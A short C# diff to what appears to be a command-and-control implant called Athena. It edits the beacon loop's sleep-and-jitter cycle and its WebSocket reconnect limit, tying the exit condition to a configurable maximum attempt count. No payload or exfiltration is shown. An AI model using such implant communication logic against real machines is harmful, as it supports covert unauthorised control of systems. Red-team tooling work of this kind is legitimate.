@@ -71,10 +71,6 @@ namespace Athena
             this.cts = new CancellationTokenSource();
             while (!cts.Token.IsCancellationRequested)
             {
-                if(this.currentAttempt > this.maxAttempts)
-                {
-                    Environment.Exit(0);
-                }
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
@@ -161,7 +157,7 @@ namespace Athena
 
                 while (ws.State != WebSocketState.Open)
                 {
-                    if (this.connectAttempts == 300)
+                    if (this.connectAttempts > this.maxAttempts)
                     {
                         Environment.Exit(0);
                     }
@@ -177,7 +173,7 @@ namespace Athena
         }
         public async Task<string> Send(string json)
         {
-            if(this.ws.State != WebSocketState.Open)
+            if (this.ws.State != WebSocketState.Open)
             {
                 Debug.WriteLine($"[{DateTime.Now}] Lost socket connection, attempting to re-establish.");
                 await Connect(this.url);
